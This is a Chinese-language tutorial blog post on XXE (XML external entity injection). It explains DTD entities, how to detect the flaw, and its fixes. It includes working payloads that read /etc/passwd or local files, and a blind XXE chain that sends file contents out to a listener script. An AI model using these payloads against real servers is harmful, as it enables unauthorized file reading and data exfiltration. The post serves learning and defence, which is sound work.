---
title: 浅谈XXE漏洞攻击与防御
copyright: true
permalink: 1
top: 0
date: 2017-06-20 10:54:08
tags:
- xxe漏洞
- xml注入
categories: web安全
password:
---
<blockquote class="blockquote-center">你会挽着我的衣袖，我会把手揣进裤兜</blockquote>
　　之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。
<!--more -->
### XML基础
在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。

#### XML文档结构
XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
```bash
<!--XML申明-->
<?xml version="1.0"?> 

<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>

<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```
由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。

#### DTD
文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。
内部声明DTD:
```bash
<!DOCTYPE 根元素 [元素声明]>
```
引用外部DTD:
```bash
<!DOCTYPE 根元素 SYSTEM "文件名">
```
DTD文档中有很多重要的关键字如下：
* DOCTYPE（DTD的声明）
* ENTITY（实体的声明）
* SYSTEM、PUBLIC（外部资源申请）

#### 实体
实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。
实体按类型主要分为以下四种：
* 内置实体 (Built-in entities)
* 字符实体 (Character entities)
* 通用实体 (General entities)
* 参数实体 (Parameter entities)

实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。
完整的实体类别可参考 [DTD - Entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)

#### 实体类别介绍
参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&实体名称。
参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。

内部实体：
```bash
<!ENTITY 实体名称 "实体的值">
```
外部实体:
```bash
<!ENTITY 实体名称 SYSTEM "URI">
```
参数实体：
```bash
<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">
```

实例演示：除参数实体外实体+内部实体
```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "nMask">]>
<foo>
        <value>&name;</value> 
</foo>
```

实例演示：参数实体+外部实体
```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file://etc/passwd">
    %name;
]>
```

注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

#### 外部实体
外部实体即在DTD中使用：
```bash
<!ENTITY 实体名称 SYSTEM "URI">
```
语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？
主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：
![](/upload_image/20170620/1.png)
实例演示：
```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY content SYSTEM "file://etc/passwd">]>
<foo>
        <value>&content;</value> 
</foo>
```

### XXE漏洞
XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

#### xxe漏洞检测
第一步检测XML是否会被成功解析：
```bash
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY name "my name is nMask">]>    
<root>&name;</root>
```
如果页面输出了my name is nMask，说明xml文件可以被解析。
![](/upload_image/20170620/2.png)

第二步检测服务器是否支持DTD引用外部实体：
```bash
<?xml version=”1.0” encoding=”UTF-8”?>  
<!DOCTYPE ANY [  
<!ENTITY % name SYSTEM "http://localhost/test.xml">  
%name;  
]>
```
可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。
![](/upload_image/20170620/3.png)
如果支持引用外部实体，那么很有可能是存在xxe漏洞的。

#### xxe漏洞利用
xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。
##### 读取任意文件
由于我是在windows上做的测试，因此让其读取c盘下的test.txt文件内容。
![](/upload_image/20170620/4.png)
如果是linux下，可以读取/etc/passwd等目录下敏感数据。

以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。

##### blind xxe漏洞
对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。

创建test.php写入以下内容：
```bash
<?php  
file_put_contents("test.txt", $_GET['file']) ;  
?>
```
创建index.php写入以下内容：
```bash
<?php  
$xml=<<<EOF  
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % file SYSTEM "file:///C:/test.txt">  
<!ENTITY % remote SYSTEM "http://localhost/test.xml">  
%remote;
%all;
%send;  
]>  
EOF;  
$data = simplexml_load_string($xml) ;  
echo "<pre>" ;  
print_r($data) ;  
?>
```
创建test.xml并写入以下内容：
```bash
[html] view plain copy
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'>">  
```
当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。

*注：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍啦*

#### xxe漏洞修复与防御
##### 使用开发语言提供的禁用外部实体的方法
PHP：
```bash
libxml_disable_entity_loader(true);
```
JAVA:
```bash
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```
Python：
```bash
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
##### 过滤用户提交的XML数据
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。

### 参考文档
https://security.tencent.com/index.php/blog/msg/69
http://blog.csdn.net/u011721501/article/details/43775691
https://b1ngz.github.io/XXE-learning-note/
http://bobao.360.cn/learning/detail/3841.html
